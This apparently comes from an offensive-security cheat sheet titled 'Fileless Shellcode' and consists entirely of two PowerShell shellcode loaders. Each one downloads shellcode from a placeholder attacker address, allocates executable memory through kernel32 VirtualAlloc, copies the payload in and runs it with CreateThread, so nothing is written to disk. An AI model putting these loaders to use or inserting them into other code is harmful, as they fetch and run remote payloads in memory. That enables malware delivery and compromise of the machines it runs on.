# Fileless Shellcode

## .NET

```powershell
$Code = @"
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
"@

$WinAPI = Add-Type -memberDefinition $Code -Name "Win32" -namespace Win32Functions -passthru

[Byte[]] $shellcode = (New-Object Net.WebClient).DownloadData("http[s]://<IP>[:PORT]/shellcode.bin")

$address = $WinAPI::VirtualAlloc(0, [Math]::Max($shellcode.Length,0x1000), 0x3000, 0x40)

[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $address, $shellcode.Length)

$WinAPI::CreateThread(0, 0, $address, 0, 0, 0)
```


```powershell
$WinAPI = @"
using System;
using System.Runtime.InteropServices;

public class Loader {
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32", CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern UInt32 WaitForSingleObject( IntPtr hHandle, UInt32 dwMilliseconds);
}
"@
Add-Type $WinAPI

$shellcode = (New-Object Net.WebClient).DownloadData("http[s]://<attacker_IP>[:PORT]/shellcode.bin")

if ($shellcode -eq $null) {
    Exit
}

$size = $shellcode.Length

[IntPtr]$address = [Loader]::VirtualAlloc(0, $size, 0x1000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $address, $size)
$handle_thread = [Loader]::CreateThread(0, 0, $address, 0, 0, 0)
[Loader]::WaitForSingleObject($handle_thread, [uint32]"0xFFFFFFFF")
```